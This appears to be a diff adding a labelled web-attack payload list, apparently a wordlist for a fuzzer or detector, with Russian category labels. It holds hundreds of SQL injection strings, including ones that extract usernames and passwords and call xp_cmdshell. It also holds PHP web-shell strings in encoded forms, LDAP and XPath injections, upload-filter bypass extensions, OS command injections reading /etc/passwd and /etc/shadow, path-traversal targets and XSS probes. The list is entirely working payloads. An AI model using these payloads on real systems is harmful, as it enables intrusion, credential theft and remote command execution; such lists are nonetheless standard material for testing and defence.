@@ -1,0 +1,660 @@
+@variable : SQL-иньекция
+,@variable : SQL-иньекция
+PRINT : SQL-иньекция
+PRINT @@variable : SQL-иньекция
+from : SQL-иньекция
+insert : SQL-иньекция
+procedure : SQL-иньекция
+limit : SQL-иньекция
+order by : SQL-иньекция
+asc : SQL-иньекция
+desc : SQL-иньекция
+delete : SQL-иньекция
+update : SQL-иньекция
+distinct : SQL-иньекция
+having : SQL-иньекция
+truncate : SQL-иньекция
+handler : SQL-иньекция
+bfilename : SQL-иньекция
+union : SQL-иньекция
+'%20-- : SQL-иньекция
+--'; : SQL-иньекция
+'%20; : SQL-иньекция
+=%20' : SQL-иньекция
+=%20; : SQL-иньекция
+=%20-- : SQL-иньекция 
+'or%20select * : SQL-иньекция
+admin'-- : SQL-иньекция
+<>"'%;)(&+ : SQL-иньекция
+'%20or%20''=' : SQL-иньекция
+'%20or%20'x'='x : SQL-иньекция
+"%20or%20"x"="x : SQL-иньекция
+')%20or%20('x'='x : SQL-иньекция
+0 or 1=1 : SQL-иньекция
+' or 0=0 -- : SQL-иньекция
+" or 0=0 -- : SQL-иньекция
+or 0=0 -- : SQL-иньекция
+' or 0=0 # : SQL-иньекция
+" or 0=0 # : SQL-иньекция
+or 0=0 # : SQL-иньекция
+' or 1=1-- : SQL-иньекция
+" or 1=1-- : SQL-иньекция
+' or '1'='1'-- : SQL-иньекция
+"' or 1 --'" : SQL-иньекция
+or 1=1-- : SQL-иньекция
+or%201=1 : SQL-иньекция
+or%201=1 -- : SQL-иньекция
+' or 1=1 or ''=' : SQL-иньекция
+" or 1=1 or ""=" : SQL-иньекция
+' or a=a-- : SQL-иньекция
+" or "a"="a : SQL-иньекция
+') or ('a'='a : SQL-иньекция
+") or ("a"="a : SQL-иньекция
+hi" or "a"="a : SQL-иньекция
+hi" or 1=1 -- : SQL-иньекция
+hi' or 1=1 -- : SQL-иньекция
+hi' or 'a'='a : SQL-иньекция
+hi') or ('a'='a : SQL-иньекция
+hi") or ("a"="a : SQL-иньекция
+'hi' or 'x'='x'; : SQL-иньекция
+' or username like '% : SQL-иньекция
+' or uname like '% : SQL-иньекция
+' or userid like '% : SQL-иньекция
+' or uid like '% : SQL-иньекция
+' or user like '% : SQL-иньекция
+exec xp : SQL-иньекция
+exec sp : SQL-иньекция
+'; exec master..xp_cmdshell : SQL-иньекция
+'; exec xp_regread : SQL-иньекция
+t'exec master..xp_cmdshell 'nslookup www.google.com'-- : SQL-иньекция
+--sp_password : SQL-иньекция
+' UNION SELECT : SQL-иньекция
+' UNION ALL SELECT : SQL-иньекция
+' or (EXISTS) : SQL-иньекция
+' (select top 1 : SQL-иньекция
+'||UTL_HTTP.REQUEST : SQL-иньекция
+1;SELECT%20\* : SQL-иньекция
+to_timestamp_tz : SQL-иньекция
+tz_offset : SQL-иньекция
+&lt;&gt;&quot;'%;)(&amp;+ : SQL-иньекция
+'%20or%201=1 : SQL-иньекция
+%27%20or%201=1 : SQL-иньекция
+%20$(sleep%2050) : SQL-иньекция
+%20'sleep%2050' : SQL-иньекция
+char%4039%41%2b%40SELECT : SQL-иньекция
+&apos;%20OR : SQL-иньекция
+'sqlattempt1 : SQL-иньекция
+(sqlattempt2) : SQL-иньекция
+*(|(mail=*)) : SQL-иньекция
+%2A%28%7C%28mail%3D%2A%29%29 : SQL-иньекция
+*(|(objectclass=*)) : SQL-иньекция
+%2A%28%7C%28objectclass%3D%2A%29%29 : SQL-иньекция
+' or 1=1 or ''=' : SQL-иньекция
+' or ''=' : SQL-иньекция
+x' or 1=1 or 'x'='y : SQL-иньекция
+ union select  : SQL-иньекция
++union+select+ : SQL-иньекция
+/**/union/**/select/**/ : SQL-иньекция
+/**/UNunionION/**/SELselectECT/**/ : SQL-иньекция
+/**//*UnIOn*//**//*SEleCt*//**/ : SQL-иньекция
+/**//*U*//*n*//*I*//*O*//*n*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/ : SQL-иньекция
+ union all select  : SQL-иньекция
++union+all+select+ : SQL-иньекция
+/**/union/**/all/**/select/**/ : SQL-иньекция
+/**/UNunionION/**/all/**/SELselectECT/**/ : SQL-иньекция
+/**//*UnIOn*//**/all/**//*SEleCt*//**/ : SQL-иньекция
+/**//*U*//*n*//*I*//*O*//*n*//**//*all*//**//*S*//*E*//*l*//*e*//*C*//*t*//**/ : SQL-иньекция
+ waitfor delay '0:0:10'-- : SQL-иньекция
++waitfor+delay+'0:0:10'-- : SQL-иньекция
+/**/waitfor/**/delay/**/'0:0:10'-- : SQL-иньекция
+%20waitfor%20delay%20'0:0:20'-- : SQL-иньекция
+ waitfor delay '0:0:10'/* : SQL-иньекция
++waitfor+delay+'0:0:10'/* : SQL-иньекция
+/**/waitfor/**/delay/**/'0:0:10'/* : SQL-иньекция
+%20waitfor%20delay%20'0:0:20'/* : SQL-иньекция
+'  waitfor delay '0:0:10'--+ : SQL-иньекция
+'+waitfor+delay+'0:0:10'--+ : SQL-иньекция
+'/**/ waitfor/**/delay/**/'0:0:10'--+ : SQL-иньекция
+'%20waitfor%20delay%20'0:0:20'--+ : SQL-иньекция
+ and 0=benchmark(3000000,MD5(1))-- : SQL-иньекция
++and+0=benchmark(3000000,MD5(1))+-- : SQL-иньекция
+/**/and/**/0=benchmark(3000000,MD5(1))/**/-- : SQL-иньекция
+%20and%200=benchmark(3000000,MD5(1))%20-- : SQL-иньекция
+ and 0=benchmark(3000000,MD5(1))/* : SQL-иньекция
++and+0=benchmark(3000000,MD5(1))+/* : SQL-иньекция
+/**/and/**/0=benchmark(3000000,MD5(1))/**//* : SQL-иньекция
+%20and%200=benchmark(3000000,MD5(1))%20/* : SQL-иньекция
+' and 0=benchmark(3000000,MD5(1))--+ : SQL-иньекция
+'+and+0=benchmark(3000000,MD5(1))+--+ : SQL-иньекция
+'/**/and/**/0=benchmark(3000000,MD5(1))/**/--+ : SQL-иньекция
+'%20and%200=benchmark(3000000,MD5(1))%20--+ : SQL-иньекция
+sleep(__TIME__)# : SQL-иньекция
+1 or sleep(__TIME__)# : SQL-иньекция
+" or sleep(__TIME__)# : SQL-иньекция
+' or sleep(__TIME__)# : SQL-иньекция
+" or sleep(__TIME__)=" : SQL-иньекция
+' or sleep(__TIME__)=' : SQL-иньекция
+1) or sleep(__TIME__)# : SQL-иньекция
+") or sleep(__TIME__)=" : SQL-иньекция
+') or sleep(__TIME__)=' : SQL-иньекция
+1)) or sleep(__TIME__)# : SQL-иньекция
+")) or sleep(__TIME__)=" : SQL-иньекция
+')) or sleep(__TIME__)=' : SQL-иньекция
+pg_sleep(__TIME__)-- : SQL-иньекция
+1 or pg_sleep(__TIME__)-- : SQL-иньекция
+" or pg_sleep(__TIME__)-- : SQL-иньекция
+' or pg_sleep(__TIME__)-- : SQL-иньекция
+1) or pg_sleep(__TIME__)-- : SQL-иньекция
+") or pg_sleep(__TIME__)-- : SQL-иньекция
+') or pg_sleep(__TIME__)-- : SQL-иньекция
+1)) or pg_sleep(__TIME__)-- : SQL-иньекция
+")) or pg_sleep(__TIME__)-- : SQL-иньекция
+')) or pg_sleep(__TIME__)-- : SQL-иньекция
+<?system('id');?> : SQL-иньекция
+<?system('uname -a');?> : SQL-иньекция
+<?php phpinfo(); ?> : SQL-иньекция
+<? system($_GET['c']); ?> : SQL-иньекция
+0x3c3f2073797374656d28245f4745545b2763275d293b203f3e : SQL-иньекция
+PD8gc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg== : SQL-иньекция
+%3C%3F%20system%28%24_GET%5B%27c%27%5D%29%3B%20%3F%3E : SQL-иньекция
+char(60,63,32,115,121,115,116,101,109,40,36,95,71,69,84,91,39,99,39,93,41,59,32,63,62) : SQL-иньекция
+data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami : SQL-иньекция
+data:;base64,PD8gZXhlYygkX0dFVFtjbWRdKTsgPz4=&cmd=whoami : SQL-иньекция
+data:;base64,<? exec($_GET[cmd]); ?>&cmd=whoami : SQL-иньекция
+ and 1=1-- : SQL-иньекция
+ and 1=2-- : SQL-иньекция
+ and 5050=5050-- : SQL-иньекция
+ and 5050=5051-- : SQL-иньекция
+ and substring(@@version,1,1)=4-- : SQL-иньекция
+ and substring(@@version,1,1)=5-- : SQL-иньекция
+ and ORD(MID((VERSION()), N, 1)) Insert<>=Comparer<InsertCharValueHere>-- : SQL-иньекция
+ and (SELECT 1 from admin limit 0,1)=1-- : SQL-иньекция
+ and (SELECT 1 from tblAdmin limit 0,1)=1-- : SQL-иньекция
+ and (SELECT 1 from Administrator limit 0,1)=1-- : SQL-иньекция
+ and (SELECT 1 from tbl_admin limit 0,1)=1-- : SQL-иньекция
+ and (SELECT 1 from user limit 0,1)=1-- : SQL-иньекция
+ and (SELECT 1 from users limit 0,1)=1-- : SQL-иньекция
+ and (SELECT 1 from TableName limit 0,1)=1-- : SQL-иньекция
+ and (SELECT substring(concat(1,ID),1,1) from admin limit 0,1)=1-- : SQL-иньекция
+ and (SELECT substring(concat(1,name),1,1) from tblAdmin limit 0,1)=1-- : SQL-иньекция
+ and (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=1-- : SQL-иньекция
+ and (SELECT substring(concat(1,password),1,1) from user limit 0,1)=1-- : SQL-иньекция
+ and (SELECT substring(concat(1,email),1,1) from users limit 0,1)=1-- : SQL-иньекция
+ and (SELECT substring(concat(1,<insert-column-guess-here>),1,1) from <table-name> limit 0,1)=1-- : SQL-иньекция
+ and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>65-- : SQL-иньекция
+ and 1=1 : SQL-иньекция
+ and 1=2 : SQL-иньекция
+ and 1>2 : SQL-иньекция
+ and 1<=2 : SQL-иньекция
++and+1=1 : SQL-иньекция
++and+1=2 : SQL-иньекция
++and+1>2 : SQL-иньекция
++and+1<=2 : SQL-иньекция
+/**/and/**/1=1 : SQL-иньекция
+/**/and/**/1=2 : SQL-иньекция
+/**/and/**/1>2 : SQL-иньекция
+/**/and/**/1<=2 : SQL-иньекция
+/**/or/**/1/**/=/**/1 : SQL-иньекция
+/**/or/**/1/**/=/**/2 : SQL-иньекция
+/**/or/**/1/**/>/**/2 : SQL-иньекция
+/**/or/**/1/**/<=/**/2 : SQL-иньекция
+ and 50=50 : SQL-иньекция
+ and 50=52 : SQL-иньекция
+ and 50>52 : SQL-иньекция
+ and 50<=52 : SQL-иньекция
++and+50=50 : SQL-иньекция
++and+50=52 : SQL-иньекция
++and+50>52 : SQL-иньекция
++and+50<=52 : SQL-иньекция
+/**/and/**/50=50 : SQL-иньекция
+/**/and/**/50=52 : SQL-иньекция
+/**/and/**/50>52 : SQL-иньекция
+/**/and/**/50<=52 : SQL-иньекция
+/**/or/**/51/**/=/**/51 : SQL-иньекция
+/**/or/**/51/**/=/**/52 : SQL-иньекция
+/**/or/**/51/**/>/**/52 : SQL-иньекция
+/**/or/**/51/**/<=/**/52 : SQL-иньекция
+ waitfor delay '0:0:10'-- : SQL-иньекция
+; waitfor delay '0:0:10'-- : SQL-иньекция
++waitfor+delay+'0:0:10'-- : SQL-иньекция
+/**/waitfor/**/delay/**/'0:0:10'- : SQL-иньекция-
+%20waitfor%20delay%20'0:0:20'-- : SQL-иньекция
+ waitfor delay '0:0:10'-- : SQL-иньекция
+; waitfor delay '0:0:10'-- : SQL-иньекция
++waitfor+delay+'0:0:10'/* : SQL-иньекция
+/**/waitfor/**/delay/**/'0:0:10'/\ : SQL-иньекция*
+%20waitfor%20delay%20'0:0:20'/* : SQL-иньекция
+'  waitfor delay '0:0:10'--+ : SQL-иньекция
+'+waitfor+delay+'0:0:10'--+ : SQL-иньекция
+'/**/ waitfor/**/delay/**/'0:0:10'--+ : SQL-иньекция
+'%20waitfor%20delay%20'0:0:20'--+ : SQL-иньекция
+ and 0=benchmark(3000000,MD5(1))-- : SQL-иньекция
++and+0=benchmark(3000000,MD5(1))+-- : SQL-иньекция
+/**/and/**/0=benchmark(3000000,MD5(1))/**/-- : SQL-иньекция
+%20and%200=benchmark(3000000,MD5(1))%20-- : SQL-иньекция
+; and 0=benchmark(3000000,MD5(1))/* : SQL-иньекция
+ and 0=benchmark(3000000,MD5(1))/* : SQL-иньекция
++and+0=benchmark(3000000,MD5(1))+/* : SQL-иньекция
+/**/and/**/0=benchmark(3000000,MD5(1))/**//* : SQL-иньекция
+%20and%200=benchmark(3000000,MD5(1))%20/* : SQL-иньекция
+' and 0=benchmark(3000000,MD5(1))--+ : SQL-иньекция
+'+and+0=benchmark(3000000,MD5(1))+--+ : SQL-иньекция
+'/**/and/**/0=benchmark(3000000,MD5(1))/**/--+ : SQL-иньекция
+'%20and%200=benchmark(3000000,MD5(1))%20--+ : SQL-иньекция
+sleep(__TIME__)# : SQL-иньекция
+1 or sleep(__TIME__)# : SQL-иньекция
+" or sleep(__TIME__)# : SQL-иньекция
+' or sleep(__TIME__)# : SQL-иньекция
+" or sleep(__TIME__)=" : SQL-иньекция
+' or sleep(__TIME__)=' : SQL-иньекция
+1) or sleep(__TIME__)# : SQL-иньекция
+") or sleep(__TIME__)=" : SQL-иньекция
+') or sleep(__TIME__)=' : SQL-иньекция
+1)) or sleep(__TIME__)# : SQL-иньекция
+")) or sleep(__TIME__)=" : SQL-иньекция
+')) or sleep(__TIME__)=' : SQL-иньекция
+pg_sleep(__TIME__)-- : SQL-иньекция
+1 or pg_sleep(__TIME__)-- : SQL-иньекция
+" or pg_sleep(__TIME__)-- : SQL-иньекция
+' or pg_sleep(__TIME__)-- : SQL-иньекция
+1) or pg_sleep(__TIME__)-- : SQL-иньекция
+") or pg_sleep(__TIME__)-- : SQL-иньекция
+') or pg_sleep(__TIME__)-- : SQL-иньекция
+1)) or pg_sleep(__TIME__)-- : SQL-иньекция
+")) or pg_sleep(__TIME__)-- : SQL-иньекция
+')) or pg_sleep(__TIME__)-- : SQL-иньекция
+%2A%28%7C%28mail%3D%2A%29%29 : LDAP-иньекция
+%2A%28%7C%28objectclass%3D%2A%29%29 : LDAP-иньекция
+%2A%7C : LDAP-иньекция
+*(|(mail=*)) : LDAP-иньекция
+*(|(objectclass=*)) : LDAP-иньекция
+x' or name()='username' or 'x'='y : LDAP-иньекция
+*()|&' : LDAP-иньекция
+admin\* : LDAP-иньекция
+admin*)((|userpassword=*) : LDAP-иньекция
+*)(uid=*))(|(uid=* : LDAP-иньекция
+*()|%26' : LDAP-иньекция
+phtml : Загрузка вредоносного файла
+php3 : Загрузка вредоносного файла
+php4 : Загрузка вредоносного файла
+php5 : Загрузка вредоносного файла
+pHtml : Загрузка вредоносного файла
+pHp3 : Загрузка вредоносного файла
+pHp4 : Загрузка вредоносного файла
+pHp5 : Загрузка вредоносного файла
+asa : Загрузка вредоносного файла
+iNc%00 : Загрузка вредоносного файла
+iNc%20%20%20 : Загрузка вредоносного файла
+iNc%20%20%20...%20.%20.. : Загрузка вредоносного файла
+iNc...... : Загрузка вредоносного файла
+inc%00 : Загрузка вредоносного файла
+inc%20%20%20 : Загрузка вредоносного файла
+inc%20%20%20...%20.%20.. : Загрузка вредоносного файла
+inc...... : Загрузка вредоносного файла
+pHp%00 : Загрузка вредоносного файла
+pHp%20%20%20 : Загрузка вредоносного файла
+pHp%20%20%20...%20.%20.. : Загрузка вредоносного файла
+pHp...... : Загрузка вредоносного файла
+pHp3%00 : Загрузка вредоносного файла
+pHp3%20%20%20 : Загрузка вредоносного файла
+pHp3%20%20%20...%20.%20.. : Загрузка вредоносного файла
+pHp3...... : Загрузка вредоносного файла
+pHp4%00 : Загрузка вредоносного файла
+pHp4%20%20%20 : Загрузка вредоносного файла
+pHp4%20%20%20...%20.%20.. : Загрузка вредоносного файла
+pHp4...... : Загрузка вредоносного файла
+pHp5%00 : Загрузка вредоносного файла
+pHp5%20%20%20 : Загрузка вредоносного файла
+pHp5%20%20%20...%20.%20.. : Загрузка вредоносного файла
+pHp5...... : Загрузка вредоносного файла
+pHtml%00 : Загрузка вредоносного файла
+pHtml%20%20%20 : Загрузка вредоносного файла
+pHtml%20%20%20...%20.%20.. : Загрузка вредоносного файла
+pHtml...... : Загрузка вредоносного файла
+php%00 : Загрузка вредоносного файла
+php%20%20%20 : Загрузка вредоносного файла
+php%20%20%20...%20.%20.. : Загрузка вредоносного файла
+php...... : Загрузка вредоносного файла
+php3%00 : Загрузка вредоносного файла
+php3%20%20%20 : Загрузка вредоносного файла
+php3%20%20%20...%20.%20.. : Загрузка вредоносного файла
+php3...... : Загрузка вредоносного файла
+php4%00 : Загрузка вредоносного файла
+php4%20%20%20 : Загрузка вредоносного файла
+php4%20%20%20...%20.%20.. : Загрузка вредоносного файла
+php4...... : Загрузка вредоносного файла
+php5%00 : Загрузка вредоносного файла
+php5%20%20%20 : Загрузка вредоносного файла
+php5%20%20%20...%20.%20.. : Загрузка вредоносного файла
+php5...... : Загрузка вредоносного файла
+phtml%00 : Загрузка вредоносного файла
+phtml%20%20%20 : Загрузка вредоносного файла
+phtml%20%20%20...%20.%20.. : Загрузка вредоносного файла
+phtml...... : Загрузка вредоносного файла
+asp%20%20%20 : Загрузка вредоносного файла
+aspx%20%20%20 : Загрузка вредоносного файла
+asa%20%20%20 : Загрузка вредоносного файла
+aSP%20%20%20 : Загрузка вредоносного файла
+aSpx%20%20%20 : Загрузка вредоносного файла
+aSa%20%20%20 : Загрузка вредоносного файла
+asp...... : Загрузка вредоносного файла
+aspx...... : Загрузка вредоносного файла
+asa...... : Загрузка вредоносного файла
+aSP...... : Загрузка вредоносного файла
+aSpx...... : Загрузка вредоносного файла
+aSa...... : Загрузка вредоносного файла
+asp%20%20%20...%20.%20.. : Загрузка вредоносного файла
+aspx%20%20%20...%20.%20.. : Загрузка вредоносного файла
+asa%20%20%20...%20.%20.. : Загрузка вредоносного файла
+aSP%20%20%20...%20.%20.. : Загрузка вредоносного файла
+aSpx%20%20%20...%20.%20.. : Загрузка вредоносного файла
+aSa%20%20%20...%20.%20.. : Загрузка вредоносного файла
+asp%00 : Загрузка вредоносного файла
+aspx%00 : Загрузка вредоносного файла
+asa%00 : Загрузка вредоносного файла
+aSp%00 : Загрузка вредоносного файла
+aSpx%00 : Загрузка вредоносного файла
+aSa%00 : Загрузка вредоносного файла
+cfm : Загрузка вредоносного файла
+cfml : Загрузка вредоносного файла
+cfc : Загрузка вредоносного файла
+dbm : Загрузка вредоносного файла
+cFm : Загрузка вредоносного файла
+cFml : Загрузка вредоносного файла
+cFc : Загрузка вредоносного файла
+dBm : Загрузка вредоносного файла
+cfm%20%20%20 : Загрузка вредоносного файла
+cfml%20%20%20 : Загрузка вредоносного файла
+cfc%20%20%20 : Загрузка вредоносного файла
+dbm%20%20%20 : Загрузка вредоносного файла
+cFm%20%20%20 : Загрузка вредоносного файла
+cFml%20%20%20 : Загрузка вредоносного файла
+cFc%20%20%20 : Загрузка вредоносного файла
+dBm%20%20%20 : Загрузка вредоносного файла
+cfm...... : Загрузка вредоносного файла
+cfml...... : Загрузка вредоносного файла
+cfc....... : Загрузка вредоносного файла
+dbm...... : Загрузка вредоносного файла
+cFm...... : Загрузка вредоносного файла
+cFml...... : Загрузка вредоносного файла
+cFc...... : Загрузка вредоносного файла
+dBm...... : Загрузка вредоносного файла
+cfm%20%20%20...%20.%20.. : Загрузка вредоносного файла
+cfml%20%20%20...%20.%20.. : Загрузка вредоносного файла
+cfc%20%20%20...%20.%20.. : Загрузка вредоносного файла
+dbm%20%20%20...%20.%20.. : Загрузка вредоносного файла
+cFm%20%20%20...%20.%20.. : Загрузка вредоносного файла
+cFml%20%20%20...%20.%20.. : Загрузка вредоносного файла
+cFc%20%20%20...%20.%20.. : Загрузка вредоносного файла
+dBm%20%20%20...%20.%20.. : Загрузка вредоносного файла
+cfm%00 : Загрузка вредоносного файла
+cfml%00 : Загрузка вредоносного файла
+cfc%00 : Загрузка вредоносного файла
+dbm%00 : Загрузка вредоносного файла
+cFm%00 : Загрузка вредоносного файла
+cFml%00 : Загрузка вредоносного файла
+cFc%00 : Загрузка вредоносного файла
+dBm%00 : Загрузка вредоносного файла
+jspx : Загрузка вредоносного файла
+jsw : Загрузка вредоносного файла
+jsv : Загрузка вредоносного файла
+jspf : Загрузка вредоносного файла
+jSpx : Загрузка вредоносного файла
+jSw : Загрузка вредоносного файла
+jSv : Загрузка вредоносного файла
+jSpf : Загрузка вредоносного файла
+jSp%00 : Загрузка вредоносного файла
+jSp%20%20%20 : Загрузка вредоносного файла
+jSp%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jSp...... : Загрузка вредоносного файла
+jSpf%00 : Загрузка вредоносного файла
+jSpf%20%20%20 : Загрузка вредоносного файла
+jSpf%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jSpf...... : Загрузка вредоносного файла
+jSpx%00 : Загрузка вредоносного файла
+jSpx%20%20%20 : Загрузка вредоносного файла
+jSpx%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jSpx...... : Загрузка вредоносного файла
+jSv%00 : Загрузка вредоносного файла
+jSv%20%20%20 : Загрузка вредоносного файла
+jSv%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jSv...... : Загрузка вредоносного файла
+jSw%00 : Загрузка вредоносного файла
+jSw%20%20%20 : Загрузка вредоносного файла
+jSw%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jSw...... : Загрузка вредоносного файла
+jsp%00 : Загрузка вредоносного файла
+jsp%20%20%20 : Загрузка вредоносного файла
+jsp%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jsp...... : Загрузка вредоносного файла
+jspf%00 : Загрузка вредоносного файла
+jspf%20%20%20 : Загрузка вредоносного файла
+jspf%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jspf...... : Загрузка вредоносного файла
+jspx%00 : Загрузка вредоносного файла
+jspx%20%20%20 : Загрузка вредоносного файла
+jspx%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jspx...... : Загрузка вредоносного файла
+jsv%00 : Загрузка вредоносного файла
+jsv%20%20%20 : Загрузка вредоносного файла
+jsv%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jsv...... : Загрузка вредоносного файла
+jsw%00 : Загрузка вредоносного файла
+jsw%20%20%20 : Загрузка вредоносного файла
+jsw%20%20%20...%20.%20..a : Загрузка вредоносного файла
+jsw...... : Загрузка вредоносного файла
+' or '1'='1 : Xpath-иньекция
+' or ''=' : Xpath-иньекция
+x' or 1=1 or 'x'='y : Xpath-иньекция
+count(/child::node()) : Xpath-иньекция
+x' or name()='username' or 'x'='y : Xpath-иньекция
+' and count(/*)=1 and '1'='1 : Xpath-иньекция
+' and count(/@*)=1 and '1'='1 : Xpath-иньекция
+' and count(/comment())=1 and '1'='1 : Xpath-иньекция
+uname -n -s : Внедрение команд ОС
+whoami|pwd : Внедрение команд ОС
+cat /etc/passwd : Внедрение команд ОС
+ls -la /tmp : Внедрение команд ОС
+ls -la /home : Внедрение команд ОС
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt; : Внедрение команд ОС
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt; : Внедрение команд ОС
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; : Внедрение команд ОС
+&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt; : Внедрение команд ОС
+/index.html|id| : Внедрение команд ОС
+;id; : Внедрение команд ОС
+;id : Внедрение команд ОС
+;netstat -a; : Внедрение команд ОС
+;id; : Внедрение команд ОС
+|id : Внедрение команд ОС
+|/usr/bin/id : Внедрение команд ОС
+|id| : Внедрение команд ОС
+|/usr/bin/id| : Внедрение команд ОС
+||/usr/bin/id| : Внедрение команд ОС
+|id; : Внедрение команд ОС
+||/usr/bin/id; : Внедрение команд ОС
+;id| : Внедрение команд ОС
+;|/usr/bin/id| : Внедрение команд ОС
+\n/bin/ls -al\n : Внедрение команд ОС
+\n/usr/bin/id\n : Внедрение команд ОС
+\nid\n : Внедрение команд ОС
+\n/usr/bin/id; : Внедрение команд ОС
+\nid; : Внедрение команд ОС
+\n/usr/bin/id| : Внедрение команд ОС
+\nid| : Внедрение команд ОС
+;/usr/bin/id\n : Внедрение команд ОС
+;id\n : Внедрение команд ОС
+|usr/bin/id\n : Внедрение команд ОС
+|nid\n : Внедрение команд ОС
+`id` : Внедрение команд ОС
+`/usr/bin/id` : Внедрение команд ОС
+a);id : Внедрение команд ОС
+a;id : Внедрение команд ОС
+a);id; : Внедрение команд ОС
+a;id; : Внедрение команд ОС
+a);id| : Внедрение команд ОС
+a;id| : Внедрение команд ОС
+a)|id : Внедрение команд ОС
+a|id : Внедрение команд ОС
+a)|id; : Внедрение команд ОС
+a|id : Внедрение команд ОС
+|/bin/ls -al : Внедрение команд ОС
+a);/usr/bin/id : Внедрение команд ОС
+a;/usr/bin/id : Внедрение команд ОС
+a);/usr/bin/id; : Внедрение команд ОС
+a;/usr/bin/id; : Внедрение команд ОС
+a);/usr/bin/id| : Внедрение команд ОС
+a;/usr/bin/id| : Внедрение команд ОС
+a)|/usr/bin/id : Внедрение команд ОС
+a|/usr/bin/id : Внедрение команд ОС
+a)|/usr/bin/id; : Внедрение команд ОС
+a|/usr/bin/id : Внедрение команд ОС
+;system('cat%20/etc/passwd') : Внедрение команд ОС
+;system('id') : Внедрение команд ОС
+;system('/usr/bin/id') : Внедрение команд ОС
+%0Acat%20/etc/passwd : Внедрение команд ОС
+%0A/usr/bin/id : Внедрение команд ОС
+%0Aid : Внедрение команд ОС
+%0A/usr/bin/id%0A : Внедрение команд ОС
+%0Aid%0A : Внедрение команд ОС
+& ping -i 30 127.0.0.1 : Внедрение команд ОС &
+& ping -n 30 127.0.0.1 & : Внедрение команд ОС
+%0a ping -i 30 127.0.0.1 %0a : Внедрение команд ОС
+`ping 127.0.0.1` : Внедрение команд ОС
+| id : Внедрение команд ОС
+& id : Внедрение команд ОС
+; id : Внедрение команд ОС
+%0a id %0a : Внедрение команд ОС
+`id` : Внедрение команд ОС
+$;/usr/bin/id : Внедрение команд ОС
+/etc/passwd : Path Traversal
+/etc/shadow : Path Traversal
+/apache/logs/error.log  : Path Traversal
+/apache/logs/access.log  : Path Traversal
+/apache/logs/error.log  : Path Traversal
+/apache/logs/access.log  : Path Traversal
+/apache/logs/error.log  : Path Traversal
+/apache/logs/access.log  : Path Traversal
+/etc/httpd/logs/acces_log  : Path Traversal
+/etc/httpd/logs/acces.log  : Path Traversal
+/etc/httpd/logs/error_log  : Path Traversal
+/etc/httpd/logs/error.log  : Path Traversal
+/var/www/logs/access_log  : Path Traversal
+/var/www/logs/access.log  : Path Traversal
+/usr/local/apache/logs/access_log  : Path Traversal
+/usr/local/apache/logs/access.log  : Path Traversal
+/var/log/apache/access_log  : Path Traversal
+/var/log/apache2/access_log  : Path Traversal
+/var/log/apache/access.log  : Path Traversal
+/var/log/apache2/access.log  : Path Traversal
+/var/log/access_log  : Path Traversal
+/var/log/access.log  : Path Traversal
+/var/www/logs/error_log  : Path Traversal
+/var/www/logs/error.log  : Path Traversal
+/usr/local/apache/logs/error_log  : Path Traversal
+/usr/local/apache/logs/error.log  : Path Traversal
+/var/log/apache/error_log  : Path Traversal
+/var/log/apache2/error_log  : Path Traversal
+/var/log/apache/error.log  : Path Traversal
+/var/log/apache2/error.log  : Path Traversal
+/var/log/error_log  : Path Traversal
+/var/log/error.log  : Path Traversal
+<script>alert('Zer0Lulz')</script> : XSS
+<ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+"><script>alert('XSS')</script> : XSS
+"><ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+=><><script>alert('XSS')</script> : XSS
+=><><ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+="><script>alert('XSS')</script> : XSS
+="><ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+='><script>alert('XSS')</script> : XSS
+='><ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+="><<script>alert('XSS')</script> : XSS
+="><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+='><<script>alert('XSS')</script> : XSS
+='><<ScRiPt>AlErT('XSS')</ScRiPt> : XSS
+<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+"><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+"><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+=><><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+=><><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+="><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+="><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+='><script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+='><ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+="><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+="><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+='><<script>alert(String.fromCharCode(88, 83, 83)</script> : XSS
+='><<ScRiPt>AlErT(String.fromCharCode(88, 83, 83)</ScRiPt> : XSS
+"%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS
+"%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS
+=%3e%3c%3e%3cscript>alert('XSS')%3c%2fscript%3e : XSS
+=%3e%3c%3e%3cScRiPt>AlErT('XSS')%3c%2fScRiPt%3e : XSS
+="%3e%3cscript%3ealert('XSS')%3c%2fscript%3e : XSS
+="%3e%3cScRiPt%3eAlErT('XSS')%3c%2fScRiPt%3e : XSS
